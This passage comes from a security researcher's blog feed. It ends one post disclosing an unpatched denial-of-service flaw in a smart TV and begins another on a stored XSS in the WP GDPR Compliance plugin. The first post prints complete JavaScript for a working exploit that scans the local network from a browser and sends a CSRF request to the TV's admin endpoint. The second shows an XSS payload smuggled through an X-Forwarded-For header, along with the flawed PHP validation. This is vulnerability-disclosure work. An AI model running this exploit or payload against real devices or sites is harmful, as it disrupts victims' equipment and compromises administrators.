</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Exploit</span> <span class="nx">code</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">width:680px;height:130px;</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Exploit</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span> <span class="nx">target</span><span class="o">=</span><span class="dl">"</span><span class="s2">_blank</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
            <span class="nf">get_hue_ip</span><span class="p">();</span>

            <span class="k">async</span> <span class="kd">function</span> <span class="nf">scan_tv_ports</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="c1">// dynamic ports 49152 - 65535</span>
                <span class="kd">var</span> <span class="nx">ports</span> <span class="o">=</span> <span class="nf">get_ports_array</span><span class="p">(</span><span class="mi">49152</span><span class="p">,</span><span class="mi">65535</span><span class="p">);</span>

                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ports</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">check</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>

                    <span class="k">await</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">50</span><span class="p">));</span>

                    <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="nx">ip</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="nx">ports</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web/file/largeIco.jpg</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="c1">//img.style.display = "none";</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">ports</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
                    <span class="nx">img</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">ip</span><span class="p">;</span>

                    <span class="nx">img</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="nx">check</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web</span><span class="dl">"</span><span class="p">;</span>
                        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="dl">"</span><span class="se">\</span><span class="s2">
&lt;script&gt;</span><span class="se">\n\</span><span class="s2">
  function submitRequest() {</span><span class="se">\n\</span><span class="s2">
    var xhr = new XMLHttpRequest();</span><span class="se">\n\</span><span class="s2">
    xhr.open('GET', '</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">/admin/setFriendlyName?name=%hostname%', true);</span><span class="se">\n\</span><span class="s2">
    xhr.send();</span><span class="se">\n\</span><span class="s2">
  }</span><span class="se">\n\</span><span class="s2">
  submitRequest();</span><span class="se">\n\</span><span class="s2">
&lt;</span><span class="se">\</span><span class="s2">/script&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit_code</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">code</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">exploit_poc</span><span class="dl">"</span><span class="p">).</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="o">+</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="o">+</span><span class="dl">"</span><span class="s2">/web</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">/admin/setFriendlyName?name=%hostname%</span><span class="dl">"</span><span class="p">;</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>

                    <span class="p">};</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span>
                    <span class="nf">setTimeout</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">this</span><span class="p">.</span><span class="k">continue</span><span class="p">;</span>
                    <span class="p">},</span> <span class="mi">50</span><span class="p">);</span>
                    
                <span class="p">}</span>
                <span class="kd">var</span> <span class="nx">imgs</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">img</span><span class="dl">'</span><span class="p">);</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">imgs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">imgs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">imgs</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">get_tv_ip</span><span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">local_ip</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">ips</span> <span class="o">=</span> <span class="nf">ip_to_range</span><span class="p">(</span><span class="nx">local_ip</span><span class="p">);</span>
                <span class="nf">scan</span><span class="p">(</span><span class="nx">ips</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">get_hue_ip</span><span class="p">()</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
                <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://discovery.meethue.com/</span><span class="dl">"</span><span class="p">)</span>
                <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
                <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">hue_ip</span><span class="p">;</span>
                    <span class="k">if </span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
                        <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
                        <span class="nx">hue_ip</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">internalipaddress</span><span class="p">;</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">hue_ip</span><span class="p">;</span>
                        <span class="nf">get_tv_ip</span><span class="p">();</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">ip_to_range</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">ips</span> <span class="o">=</span> <span class="p">[];</span>
                <span class="kd">var</span> <span class="nx">ip_parts</span> <span class="o">=</span> <span class="nx">ip</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="p">);</span>
                <span class="k">if</span><span class="p">(</span> <span class="nx">ip_parts</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">4</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">for</span><span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">255</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">tmp_ip</span> <span class="o">=</span> <span class="nx">ip_parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">ip_parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">ip_parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">i</span><span class="p">;</span>
                    <span class="nx">ips</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span> <span class="nx">tmp_ip</span> <span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">ips</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">get_ports_array</span><span class="p">(</span><span class="nx">lowEnd</span><span class="p">,</span> <span class="nx">highEnd</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">ports</span> <span class="o">=</span> <span class="p">[];</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">lowEnd</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">highEnd</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">ports</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">ports</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">scan</span><span class="p">(</span><span class="nx">ips</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ips</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">ifrm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="nx">ips</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">:4123</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">ips</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">iframes</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
                        <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">iframes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">iframes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">iframes</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                        <span class="p">}</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
                        <span class="nf">scan_tv_ports</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>
                    <span class="p">};</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">ifrm</span><span class="p">);</span>
                    <span class="nf">setTimeout</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">this</span><span class="p">.</span><span class="k">continue</span><span class="p">;</span>
                    <span class="p">},</span> <span class="mi">50</span><span class="p">);</span> 
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>

<hr />

<h3 id="example">Example</h3>

<p>The following example is accelerated. The full port scan phase can take up to 5 - 10 minutes. However, it’s because the PoC is not optimized for speed.</p>

<p><img src="/assets/img/2021/03/exploit-poc.gif" alt="" title="Proof of Concept Exploit" /></p>

<p>If the attacker is already in the same network as the smart TV, it would be much faster and easier to use Nmap or something like that.</p>

<hr />

<p>Honestly, I didn’t have much time to do even a network scan or motivation to reverse engineer the firmware, but I believe there is much more to uncover. It would be an excellent topic for further research. I guess it’s just a matter of time until we see the first <strong>Smart TV Exploit Kit</strong>.</p>

<p>I decided to drop this one as a 0day since I couldn’t convince the vendor to release a fix in the past 90 days. Users can move smart appliances to a separate VLAN to be safe. Other than that, the TV itself is not that bad, and I’m somewhat satisfied with the purchase.</p>

<h3 id="timeline">Timeline</h3>

<ul>
  <li>December 8th, 2020 ~ I bought a TV, found a vulnerability</li>
  <li>December 8th, 2020 ~ Reached to the support via the contact form on the vendors’ website</li>
  <li>December 8th, 2020 ~ Sent emails to a couple of vendors’ email addresses</li>
  <li>December 11th, 2020 ~ Wrote a working Proof of Concept exploit</li>
  <li>December 11th, 2020 ~ Sent an email to an address found on a different vendors’ website</li>
  <li>December 11th, 2020 ~ Received a response and discussed the findings</li>
  <li>December 22nd, 2020 ~ I received a response that the ports can’t be closed, and it’s most likely a won’t-fix issue</li>
  <li>March 11th, 2021 ~ Published a responsible disclosure report (90 days since the initial response)</li>
</ul>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Responsible disclosure" /><category term="0day" /><category term="exploit" /><category term="dos" /><category term="smart-tv" /><summary type="html"><![CDATA[tl;dr: I found a remotely exploitable DoS vulnerability in my “smart” TV in less than two hours after unboxing. I have released full details, including a 0-day PoC exploit.]]></summary></entry><entry><title type="html">WP GDPR Compliance &amp;lt;= 1.5.5 - Unauthenticated Cross-Site Scripting (XSS)</title><link href="http://localhost:4000/blog/2021-02-16-wp-gdpr-compliance-unauthenticated-xss/" rel="alternate" type="text/html" title="WP GDPR Compliance &amp;lt;= 1.5.5 - Unauthenticated Cross-Site Scripting (XSS)" /><published>2021-02-16T01:00:00+01:00</published><updated>2021-02-16T01:00:00+01:00</updated><id>http://localhost:4000/blog/wp-gdpr-compliance-unauthenticated-xss</id><content type="html" xml:base="http://localhost:4000/blog/2021-02-16-wp-gdpr-compliance-unauthenticated-xss/"><![CDATA[<p>tl;dr: The GDPR Compliance &lt;= 1.5.5 plugin allowed unauthenticated users to exploit Stored Cross-Site Scripting (XSS) in the administration panel, which might lead to the privilege escalation. That was due to clients’ IP Addresses reflected in the plugin’s dashboard without being correctly validated or escaped.</p>

<hr />

<p>I have just recently joined a <a href="https://detectify.com/">Detectify</a> crowdsource team, and I must say the platform is impressive. So I promised myself that I would spend some of the weekends looking for WordPress vulnerabilities to contribute with modules to the scanner. For the vulnerability to be accepted, the plugin must have at least 200k  installations.</p>

<p>I started browsing <a href="https://wordpress.org/plugins/browse/popular/">popular</a> WP plugins, looking for ones that meet the criteria. After a while, I saw a GDPR plugin with 200,000+ active installations, and it caught my attention because I remember that there were some with critical vulnerabilities when the whole cookie consent thing was made mandatory and developers were racing with new plugins.</p>

<p>After checking the <a href="https://wordpress.org/plugins/wp-gdpr-compliance/">plugin page</a>, too see if there is any attack surface, one screenshot was interesting:</p>

<p><img src="/assets/img/2021/02/gdpr-screenshot.png" alt="" title="Overview of the view and delete requests by your site's visitors." /></p>

<p>The description said: <em>Overview of the view and delete requests by your site’s visitors.</em>, which indicated a dashboard in the admin panel with GDPR “delete requests” results, including the Email and IP Address of the user, could be a potential attack vector.</p>

<hr />

<h3 id="discovery-phase">Discovery phase</h3>

<p>After downloading the plugin and activating it in the <a href="https://github.com/vavkamil/dvwp">DVWP</a> docker container, I published a page (with the form) to request deleting the user data and begin the black-box testing. Validation of the e-mail input was correct, but when I tried to spoof the IP address via <code class="language-plaintext highlighter-rouge">X-Forwarded-For: 1.1.1.1"&gt;&lt;img src=x onerror=alert(1)&gt;</code>, the XSS payload executed. What a surprise, it took me less than 10 minutes to find a “<em>Blind XSS</em>” vulnerability triggered in the context of a privileged user.</p>

<p><img src="/assets/img/2021/02/gdpr-data-access-request.png" alt="" title="Data Access Requests" /></p>

<hr />

<h3 id="root-cause-analysis">Root cause analysis</h3>

<p>At that point, I finished the testing, and I quickly moved to a source code review to locate the vulnerable code and continue with the white-box testing. Quick <em>grep</em> command revealed a database column <code class="language-plaintext highlighter-rouge">`ip_address` varchar(255) NOT NULL</code>, which was a nice surprise to see because thanks to that, it was possible to store the whole XSS payload. The IP address from the form is assigned being via <code class="language-plaintext highlighter-rouge">$request-&gt;setIpAddress(Helper::getClientIpAddress());</code> and the <code class="language-plaintext highlighter-rouge">getClientIpAddress()</code> is pretty much a standard function to check several headers for proxies and stuff like that. But what was confusing is that there was a <code class="language-plaintext highlighter-rouge">self::validateIpAddress($ipAddress)</code> call to validate the IP. The <code class="language-plaintext highlighter-rouge">validateIpAddress()</code> function:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cd">/**
     * Ensures an ip address is both a valid IP and does not fall within
     * a private network range.
     *
     * @param string $ipAddress
     * @return bool
     */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">validateIpAddress</span><span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ipAddress</span><span class="p">)</span> <span class="o">===</span> <span class="s1">'unknown'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">// Generate ipv4 network address</span>
        <span class="nv">$ipAddress</span> <span class="o">=</span> <span class="nb">ip2long</span><span class="p">(</span><span class="nv">$ipAddress</span><span class="p">);</span>
        <span class="c1">// If the ip is set and not equivalent to 255.255.255.255</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="cd">/**
             * Make sure to get unsigned long representation of ip
             * due to discrepancies between 32 and 64 bit OSes and
             * signed numbers (ints default to signed in PHP)
             */</span>
            <span class="nv">$ipAddress</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'%u'</span><span class="p">,</span> <span class="nv">$ipAddress</span><span class="p">);</span>
            <span class="c1">// Do private network range checking</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">50331647</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">167772160</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">184549375</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">2130706432</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">2147483647</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">2851995648</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">2852061183</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">2886729728</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">2887778303</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">3221225984</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">3221226239</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">3232235520</span> <span class="o">&amp;&amp;</span> <span class="nv">$ipAddress</span> <span class="o">&lt;=</span> <span class="mi">3232301055</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$ipAddress</span> <span class="o">&gt;=</span> <span class="mi">4294967040</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>After looking at the code for a longer time than I would like to admit, I realized that the whole logic is fundamentally flawed. The interesting part is the <a href="https://www.php.net/manual/en/function.ip2long.php">ip2long</a> function, which generates a long integer representation of IPv4, which is then later checked via a list of known network ranges. But when the input is invalid, it will return <strong>false</strong>: <code class="language-plaintext highlighter-rouge">ip2long ( string $ip ) : int|false</code>. The <code class="language-plaintext highlighter-rouge">validateIpAddress()</code> is never catching that, so the valid IP is being validated, but the invalid IP will always return <strong>true</strong>, resulting in the payload stored in the database. And because the developer was confident in the check, it is never escaped when retrieved from the database and rendered in the admin dashboard.</p>

<hr />

<h3 id="proof-of-concept">Proof of Concept:</h3>

